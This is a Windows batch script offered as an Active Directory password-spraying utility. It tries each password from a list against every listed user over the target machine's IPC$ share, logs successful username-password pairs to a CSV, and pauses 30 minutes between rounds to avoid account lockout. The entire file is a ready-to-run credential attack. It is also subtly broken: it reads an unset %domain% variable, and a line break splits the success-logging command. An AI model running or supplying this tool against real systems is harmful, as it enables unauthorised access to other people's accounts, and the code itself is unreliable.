@echo off

echo ------------------------------------
echo -   AD Password Spraying Utility   -
echo ------------------------------------
echo.

::Input variables
set /p password_file="Where is your password file located: "
set /p user_file="Where is your user file located: "
set /p domain_name="What domain are you testing against: "
set /p machine_name="What machine are you testing against: "
set /p output_file="Name of output file (.csv will be appended): "


::This will test every user in the password file against each password in the password file.
::It is set to iterate users first to prevent account lockout against passwords
::If successful it will output the username and password to a file then delete the IPC share

for /F %%A in (%password_file%) do (
	for /F %%B in (%user_file%) do (
		echo Trying %%A against %%B
		net use \\%machine_name%\IPC$ /user:%domain%\%%B %%A >NUL 2>&1 && echo %

%B,%%A >> %output_file%.csv && net use /delete \\%machine_name%\IPC$ > NUL
	)
  ::This will pause the script for 30 minutes (1800 seconds)
	TIMEOUT /t 1800 /nobreak 
)


::Program finished
echo Task Complete.
PAUSE
